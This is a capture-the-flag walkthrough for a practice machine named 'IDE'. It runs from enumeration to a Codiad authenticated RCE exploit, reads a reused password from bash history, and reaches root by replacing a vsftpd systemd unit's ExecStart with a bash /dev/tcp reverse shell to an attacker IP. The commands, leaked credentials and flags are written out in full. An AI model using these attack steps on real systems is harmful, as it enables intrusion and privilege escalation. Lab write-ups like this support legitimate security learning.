@@ -1,0 +1,168 @@
+//ok this one is funny...its an easy room but they say they would test our enum skills
+
+//its basically harder when you lack information...XD
+
+//my usual nmap missed a port...I had to do a full scan (TAKES AGES FOR ME)
+
+
+//then analysed the open ports individually for services information
+
+
+//I think its a better way and I am keeping it (thanks to this ctf)
+
+
+//at first I thought ftp folder was empty XD the folder was named ...
+
+//I cd into it and find a file named -
+
+drac tells john he can use default credentials to login and that he have to take care of a picture (I sense stegano)
+
+//in nmap we found the actual website use codiad 2.8.4
+
+//as we dont know what that is we google..
+
+// no default creds but it seems to be an ide for web browsers..and there is an authenticated RCE vuln with exploitdb script...we could use metasploit too
+
+//did random trials and got it (I was about to bruteforce with hydra)
+
+john : password 
+
+//as we can login we see the code jon was workig on but nothing useful in it
+
+//let's us exploit db python script to rce as john
+
+python exploit.py http://10.10.172.231:62337/ john password 10.8.226.203 2311 linux
+
+
+//and we are in
+
+//first we get comfortable
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+www-data@ide:/home$ cd drac
+cd drac
+www-data@ide:/home/drac$ ls
+ls
+user.txt
+www-data@ide:/home/drac$ cat user.txt
+cat user.txt
+cat: user.txt: Permission denied
+
+//yo what? 
+
+ls -al
+total 52
+drwxr-xr-x 6 drac drac 4096 Aug  4 07:06 .
+drwxr-xr-x 3 root root 4096 Jun 17 14:01 ..
+-rw------- 1 drac drac   49 Jun 18 06:02 .Xauthority
+-rw-r--r-- 1 drac drac   36 Jul 11 12:11 .bash_history
+-rw-r--r-- 1 drac drac  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 drac drac 3787 Jul 11 11:53 .bashrc
+drwx------ 4 drac drac 4096 Jun 18 06:03 .cache
+drwxr-x--- 3 drac drac 4096 Jun 18 06:47 .config
+drwx------ 4 drac drac 4096 Jun 18 06:48 .gnupg
+drwx------ 3 drac drac 4096 Jun 18 05:49 .local
+-rw-r--r-- 1 drac drac  807 Apr  4  2018 .profile
+-rw-r--r-- 1 drac drac    0 Jun 17 14:03 .sudo_as_admin_successful
+-rw------- 1 drac drac  557 Jun 18 05:49 .xsession-errors
+-r-------- 1 drac drac   33 Jun 18 06:32 user.txt
+
+
+//ok drac only can read the flag but anyone can read his bash history...lol
+cat .bash_history
+mysql -u drac -p 'Th3dRaCULa1sR3aL'
+
+www-data@ide:/home/drac$ su drac 
+su drac 
+Password: Th3dRaCULa1sR3aL
+
+//maybe this will ssh too...anyway
+
+drac@ide:~$ cat user.txt
+cat user.txt
+02930d21a8eb009f6d26361b2d24a466
+
+//now privileges
+
+//the first step sudo -l
+
+Matching Defaults entries for drac on ide:
+env_reset, mail_badpass,
+secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User drac may run the following commands on ide:
+(ALL : ALL) /usr/sbin/service vsftpd restart
+
+
+//the ftp service? hmm? we can modify that
+
+locate vsftpd.service
+/etc/systemd/system/multi-user.target.wants/vsftpd.service
+
+cd /etc/systemd/system/multi-user.target.wants
+
+cat vsftpd.service
+
+[Unit]
+Description=vsftpd FTP server
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf
+ExecReload=/bin/kill -HUP $MAINPID
+ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty
+
+[Install]
+WantedBy=multi-user.target
+
+//alright let's change the ExecStart to a reverse shell
+
+[Unit]
+Description=vsftpd FTP server
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.8.226.203/4444 0>&1'
+ExecReload=/bin/kill -HUP $MAINPID
+ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty
+
+[Install]
+WantedBy=multi-user.target
+
+
+// we echo all that in vsftpd.service and listen with a new netcat on said port
+
+//now we restart the service..reload daemon first
+
+systemctl daemon-reload
+==== AUTHENTICATING FOR org.freedesktop.systemd1.reload-daemon ===
+Authentication is required to reload the systemd state.
+Authenticating as: drac
+Password: Th3dRaCULa1sR3aL
+
+==== AUTHENTICATION COMPLETE ===
+
+
+drac@ide:/etc/systemd/system/multi-user.target.wants$ sudo /usr/sbin/service vsftpd restart
+
+//aaand...NOTHING
+
+//ok idk why but I had to do the restart twice lol
+
+root@ide:/# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+cat root.txt
+ce258cb16f47f1c66f0b0b77f4e0fb8d
+
+
+//yeah easy rooms are the most annoying and frustating imo XD
+
+//it was a good room
+
+
+
+
